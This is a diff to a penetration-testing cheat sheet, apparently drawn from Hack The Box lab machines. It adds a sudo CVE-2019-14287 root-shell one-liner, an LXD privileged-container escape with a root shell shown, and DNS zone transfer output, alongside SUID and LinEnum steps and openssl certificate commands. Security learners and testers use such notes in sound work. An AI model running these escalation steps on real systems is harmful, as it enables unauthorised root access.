@@ -648,6 +648,12 @@ pip install xlrd==1.2.0
 ```
 /sbin/getcap -r / 2>/dev/null
 ```
+
+## Sudo underflow bug (CVE-2019-14287)
+```
+sudo -u#-1 /bin/bash
+```
+
 ## LinEnum
 Download [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) and run it on victim's machine. 
 
@@ -682,6 +688,29 @@ find / -perm -u=s -type f 2>/dev/null
 bash -p
 ```
 
+## LXD
+1. check if user is in lxd group by running ```id```
+2. download and build build-alpinge using this [git repository](https://github.com/lxd-images/alpine-3-7-apache-php5-6)
+3. initialize image inside a new container on victim machine
+```
+flynn@light-cycle:~$ lxc image list
+To start your first container, try: lxc launch ubuntu:18.04
+
++--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
++--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+| Alpine | a569b9af4e85 | no     | alpine v3.12 (20201220_03:48) | x86_64 | 3.07MB | Dec 20, 2020 at 3:51am (UTC) |
++--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+
+flynn@light-cycle:~$ lxc init Alpine test -c security.privileged=true
+iflynn@ligt-cycle:~$ lxc config device add test testdev disk source=/ path=/mnt/root recursive=true
+flynn@light-cycle:~$ lxc start test
+flynn@light-cycle:~$ lxc exec test /bin/sh
+~ # whoami
+root
+```
+
+
 
 # SMTP
 ## Extract Mails from Server using Telnet (Authenticated, IMAP)
@@ -700,6 +729,38 @@ a5 FETCH 2 BODY[]
 ``` bash
 dnsrecon -r 127.0.0.1/24 -n <IP of DNS Server>
 ```
+### query dns server with nslookup
+```
+nslookup
+# set dns server
+> server 10.10.10.13                                                                                                                                                     
+Default server: 10.10.10.13
+Address: 10.10.10.13#53               
+# lookup ip
+> 10.10.10.13                        
+13.10.10.10.in-addr.arpa        name = ns1.cronos.htb
+```
+
+## Zone transfer
+```
+[16:18:50]-[kali@kali]-[~/hackthebox/boxes/cronos] » dig axfr cronos.htb @ns1.cronos.htb                                                                            10 ↵
+
+; <<>> DiG 9.16.6-Debian <<>> axfr cronos.htb @ns1.cronos.htb
+;; global options: +cmd
+cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+cronos.htb.             604800  IN      NS      ns1.cronos.htb.
+cronos.htb.             604800  IN      A       10.10.10.13
+admin.cronos.htb.       604800  IN      A       10.10.10.13
+ns1.cronos.htb.         604800  IN      A       10.10.10.13
+www.cronos.htb.         604800  IN      A       10.10.10.13
+cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+;; Query time: 95 msec
+;; SERVER: 10.10.10.13#53(10.10.10.13)
+;; WHEN: Wed Dec 23 16:19:03 CET 2020
+;; XFR size: 7 records (messages 1, bytes 203)
+
+```
+
 
 # SSH
 ## Crack Passphrase for given SSH-Key
@@ -882,6 +943,11 @@ openssl x509 -text -noout -in crt.crt
 
 ```bash
 openssl req -out CSR.csr -new -newkey rsa:4096 -nodes -keyout key.key
+```
+
+## Sign a CSR
+```bash
+openssl x509 -req -sha256 -days 1000 -in server.csr -signkey server.key -out server.pem
 ```
 
 ## Generate a self-signed Certificate
